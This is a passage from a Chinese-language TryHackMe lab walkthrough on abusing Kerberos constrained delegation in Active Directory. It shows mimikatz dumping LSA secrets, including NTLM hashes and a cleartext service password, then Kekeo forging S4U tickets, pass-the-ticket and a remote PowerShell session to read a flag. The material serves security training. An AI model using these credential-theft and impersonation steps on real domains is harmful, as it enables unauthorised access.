plain">tryhackme</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> WSMAN/THMSERVER1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> http/THMSERVER1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">za</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">tryhackme</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loc</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> http/THMSERVER1</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">objectcategory           : CN=Person</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">CN=Schema</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">CN=Configuration</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=tryhackme</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">DC=loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dscorepropagationdata    : 1/1/1601 12:00:00 AM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">serviceprincipalname     : HTTP/svcServWeb</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">za</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">tryhackme</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">givenname                : IIS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lastlogon                : 12/12/2023 6:16:12 AM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">badpwdcount              : 1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cn                       : IIS Server</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">useraccountcontrol       : NORMAL_ACCOUNT</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> DONT_EXPIRE_PASSWORD</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> TRUSTED_TO_AUTH_FOR_DELEGATION</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">whencreated              : 4/27/2022 11:26:21 AM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">primarygroupid           : 513</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pwdlastset               : 4/29/2022 11:50:25 AM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">usnchanged               : 155707</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后启动 mimikatz</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\Users\t2_melanie.davies&gt; C:\Tools\mimikatz_trunk\x64\mimikatz.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> .## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` (benjamin@gentilkiwi.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> &#x27;## v ##&#x27;       Vincent LE TOUX             (vincent.letoux@gmail.com)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &#x27;#####&#x27;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # token::elevate</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Token Id  : 0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User name :</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID name  : NT AUTHORITY\SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">488     {0;000003e7} 1 D 17769          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> -&gt; Impersonated !</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * Process Token : {0;00363712} 0 D 3569247     ZA\t2_melanie.davies    S-1-5-21-3885271727-2693558621-2658995185-5929  (12g,24p)       Primary</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * Thread Token  : {0;000003e7} 1 D 3598685     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # lsadump::secrets</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain : THMWRK1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SysKey : a1403e57976b472bce5f231922ca3942</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Local name : THMWRK1 (S-1-5-21-3226461851-763325627-4205969673)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain name : ZA (S-1-5-21-3885271727-2693558621-2658995185)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain FQDN : za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Policy subsystem is : 1.18</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">LSA Key(s) : 1, default {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [00] {cfcff4be-beab-7d93-cfa3-edb6a9a3bf27} 929bd1cdc726d31f5eea6fa5266a09521afd0be6309a08fd604c9a95c2af4463</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Secret  : $MACHINE.ACC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cur/text: 0FFIKa&quot;c[#L6T&gt;=.s*ZW&#x27;Gz04FL&amp;7,&quot;VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&amp;?neR%&gt;l_W!w&amp;.oz@1MDJHs`&amp;suI rmg,g GQsb%),mlWLo?6$kqP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NTLM:4207d1b7e4b942da2371174b772fdf5e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">old/text: 0FFIKa&quot;c[#L6T&gt;=.s*ZW&#x27;Gz04FL&amp;7,&quot;VjxxhLeXqmI\%Q%c..g?=olZZlnTA#J@;*8+&amp;?neR%&gt;l_W!w&amp;.oz@1MDJHs`&amp;suI rmg,g GQsb%),mlWLo?6$kqP</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    NTLM:4207d1b7e4b942da2371174b772fdf5e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    SHA1:c67c43d5a5d002f67371024ef1aa22db76ab44db</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Secret  : DefaultPassword</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">old/text: vagrant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Secret  : DPAPI_SYSTEM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cur/hex : 01 00 00 00 b6 54 c4 83 d9 88 10 f6 ee ae fc b7 ed 2d a2 d6 47 11 3f 8f 4a 6d 7f 72 35 b8 a2 93 3d 5c 5e 3f 03 8d 79 49 90 e7 2e e0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    full: b654c483d98810f6eeaefcb7ed2da2d647113f8f4a6d7f7235b8a2933d5c5e3f038d794990e72ee0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    m/u : b654c483d98810f6eeaefcb7ed2da2d647113f8f / 4a6d7f7235b8a2933d5c5e3f038d794990e72ee0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">old/hex : 01 00 00 00 10 4d a3 82 e2 da 30 1f 33 d6 49 a4 c9 81 26 e5 25 59 bb 9f 8a 76 b1 5d 59 c6 87 c6 32 b7 02 0b c1 5b 24 f4 44 d0 74 31</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    full: 104da382e2da301f33d649a4c98126e52559bb9f8a76b15d59c687c632b7020bc15b24f444d07431</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    m/u : 104da382e2da301f33d649a4c98126e52559bb9f / 8a76b15d59c687c632b7020bc15b24f444d07431</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Secret  : NL$KM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cur/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 97 ec 7f 49 a1 79 15 d9 a0 04 ac 58</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">old/hex : 10 bb 99 02 da 94 4a 26 cd ad 07 f3 62 64 53 5c a8 12 be e3 16 1f 8f 99 ae ab 97 37 c4 bc ee df 63 7c 2f 6d 07 c5 d9 5e 29 e7 ce ce 48 52 47 19 8a 03 99 ff 97 ec 7f 49 a1 79 15 d9 a0 04 ac 58</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Secret  : _SC_thmwinauth / service &#x27;thmwinauth&#x27; with username : svcIIS@za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">cur/text: Password1@</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>随后利用 Kekeo 开始生成票据</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:Password1@</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Realm        : za.tryhackme.loc (za)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User         : svcIIS (svcIIS)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Need PAC     : Yes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt): 43460d636f269c709b20049cee36ae7a</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[kdc] name: THMDC.za.tryhackme.loc (auto)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[kdc] addr: 10.200.120.101 (auto)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &gt; Ticket in file &#x27;TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>有了生成好的 TGT 之后，开始伪造 TGS 请求</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.jones /service:http/THMSERVER1.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Ticket  : TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [krb-cred]     E: [00000012] aes256_hmac</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [enc-krb-cred] T: [12/12/2023 10:24:44 AM ; 12/12/2023 8:24:44 PM] {R:12/19/2023 10:24:44 AM}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 12b5685331be5e0611849c91867c2be0d0e86195970defd5e10199b76b45f2bf</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [s4u2self]  t1_trevor.jones</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[kdc] name: THMDC.za.tryhackme.loc (auto)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[kdc] addr: 10.200.120.101 (auto)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &gt; Ticket in file &#x27;TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi&#x27;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service(s):</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  &gt; Ticket in file &#x27;TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接下来使用 mimikatz 利用生成的两个 TGS</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # privilege::debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Privilege &#x27;20&#x27; OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* File: &#x27;TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi&#x27;: OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # kerberos::ptt TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">* File: &#x27;TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi&#x27;: OK</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # exit</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>接下来检查票据是否导入</p><div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">PS</span><span class="token plain"> C:\&gt; </span><span class="token function" style="color:#d73a49">New-PSSession</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ComputerName thmserver1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">za</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">tryhackme</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><span class="token operator" style="color:#393A34">--</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token plain">            </span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token plain">    </span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token plain">    </span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">         </span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">-</span><span class="token plain">     </span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token operator" style="color:#393A34">--</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  1 WinRM1          thmserver1</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">z</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain"> RemoteMachine   Opened        Microsoft</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">PowerShell     Available</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>然后利用此票据</p><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">PS C:\&gt; Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[thmserver1.za.tryhackme.loc]: PS C:\Users\t1_trevor.jones\Documents&gt; cd ../../</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[thmserver1.za.tryhackme.loc]: PS C:\Users&gt; ls</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    Directory: C:\Users</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Mode                LastWriteTime         Length Name</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">----                -------------         ------ ----</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        4/30/2022  11:07 AM                .NET v2.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        4/30/2022  11:07 AM                .NET v2.0 Classic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        4/30/2022  11:07 AM                .NET v4.5</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        4/30/2022  11:07 AM                .NET v4.5 Classic</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        4/25/2022   8:52 PM                Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        4/27/2022   8:32 AM                Administrator.ZA</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        4/30/2022  11:07 AM                Classic .NET AppPool</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-r---        3/21/2020   8:25 PM                Public</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        6/13/2022   2:43 PM                t1_jake.scott</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        6/13/2022   2:32 PM                t1_jay.wilson</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        6/13/2022   2:28 PM                t1_steven.blake</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        4/30/2022   3:30 PM                t1_trevor.jones</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        4/30/2022   4:15 PM                trevor.local</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">d-----        3/21/2020   8:52 PM                vagrant</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[thmserver1.za.tryhackme.loc]: PS C:\Users&gt; cd .\Administrator\Desktop\</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[thmserver1.za.tryhackme.loc]: PS C:\Users\Administrator\Desktop&gt; type .\flag2.txt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">THM{Constrained.Delegation.Can.Be.Very.Bad}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div></details><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{Constrained.Delegation.Can.Be.Very.Bad}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
